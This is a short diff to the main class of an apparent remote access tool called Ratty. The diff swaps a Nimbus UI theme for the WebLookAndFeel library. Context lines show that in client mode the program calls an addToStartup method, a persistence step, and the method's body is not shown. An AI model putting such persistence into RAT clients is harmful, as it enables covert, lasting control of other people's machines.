@@ -1,15 +1,13 @@
 package de.sogomn.rat;
 
-import java.awt.Color;
 import java.io.File;
 import java.io.IOException;
 import java.net.URI;
 import java.net.URISyntaxException;
 
 import javax.swing.JOptionPane;
-import javax.swing.UIDefaults;
-import javax.swing.UIManager;
-import javax.swing.plaf.nimbus.NimbusLookAndFeel;
+
+import com.alee.laf.WebLookAndFeel;
 
 import de.sogomn.engine.util.FileUtils;
 import de.sogomn.rat.server.ActiveServer;
@@ -28,23 +26,6 @@ public final class Ratty {
 	
 	private Ratty() {
 		//...
-	}
-	
-	private static void setLookAndFeel() {
-		final NimbusLookAndFeel nimbus = new NimbusLookAndFeel();
-		final UIDefaults defaults = nimbus.getDefaults();
-		
-		defaults.put("control", new Color(245, 245, 245));
-		defaults.put("nimbusBase", new Color(225, 225, 225));
-		defaults.put("Table:\"Table.cellRenderer\".background", new Color(225, 225, 225));
-		defaults.put("Table.alternateRowColor", new Color(175, 175, 175));
-		defaults.put("Tree.background", new Color(245, 245, 245));
-		
-		try {
-			UIManager.setLookAndFeel(nimbus);
-		} catch (final Exception ex) {
-			ex.printStackTrace();
-		}
 	}
 	
 	private static void addToStartup() {
@@ -87,7 +68,8 @@ public final class Ratty {
 	}
 	
 	public static void main(final String[] args) {
-		setLookAndFeel();
+		//setLookAndFeel();
+		WebLookAndFeel.install();
 		
 		if (CLIENT) {
 			addToStartup();
